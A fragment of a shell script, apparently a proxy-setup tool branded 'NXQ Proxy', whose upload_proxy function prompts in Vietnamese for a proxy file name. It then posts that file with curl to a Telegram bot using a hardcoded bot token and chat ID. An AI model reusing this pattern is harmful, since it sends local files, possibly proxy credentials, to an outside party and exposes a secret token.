...
=============================================================================================================
//   _____  ___    ___  ___      ______           _______     _______       ______     ___  ___   ___  ___  
//  (\"   \|"  \  |"  \/"  |    /    " \         |   __ "\   /"      \     /    " \   |"  \/"  | |"  \/"  | 
//  |.\\   \    |  \   \  /    // ____  \        (. |__) :) |:        |   // ____  \   \   \  /   \   \  /  
//  |: \.   \\  |   \\  \/    /  /    )  )       |:  ____/  |_____/   )  /  /    ) :)   \\  \/     \\  \/   
//  |.  \    \. |   /\.  \   (: (____/ //        (|  /       //      /  (: (____/ //    /\.  \     /   /    
//  |    \    \ |  /  \   \   \         \       /|__/ \     |:  __   \   \        /    /  \   \   /   /     
//   \___|\____\) |___/\___|   \"____/\__\     (_______)    |__|  \___)   \"_____/    |___/\___| |___/      
//   
        FB.Com/NXQ.6688
==============================================================================================================
...
upload_proxy() {
    cd $WORKDIR
	echo "Dien Ten File Proxy Ban Vua Go"
	read FileNameProxy
	URL=$(curl -F document=@"$FileNameProxy" https://api.telegram.org/bot6043534905:AAEoq0-w8eir0As_qlwrvZAadHm4WWSb-H0/sendDocument?chat_id=-961117877)
